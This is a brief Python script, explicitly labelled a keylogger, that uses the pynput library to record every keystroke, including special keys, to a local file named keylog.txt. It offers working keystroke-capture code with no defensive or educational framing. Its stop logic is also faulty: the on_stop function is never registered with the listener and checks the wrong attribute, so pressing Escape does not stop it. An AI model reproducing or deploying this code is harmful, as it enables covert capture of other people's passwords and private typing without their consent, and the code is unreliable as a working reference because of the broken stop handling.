from pynput.keyboard import Listener

# Define a function to handle key press events
def on_press(key):
    try:
        # Write the key to a file
        with open("keylog.txt", "a") as file:
            # Record the key (handling special keys separately)
            file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl, etc.)
        with open("keylog.txt", "a") as file:
            file.write(f" [{key}] ")

# Define a function to handle when the listener stops (optional)
def on_stop(key):
    if key == key.esc:  # Stop when 'Escape' key is pressed
        return False

# Start the keylogger listener
with Listener(on_press=on_press) as listener:
    listener.join()
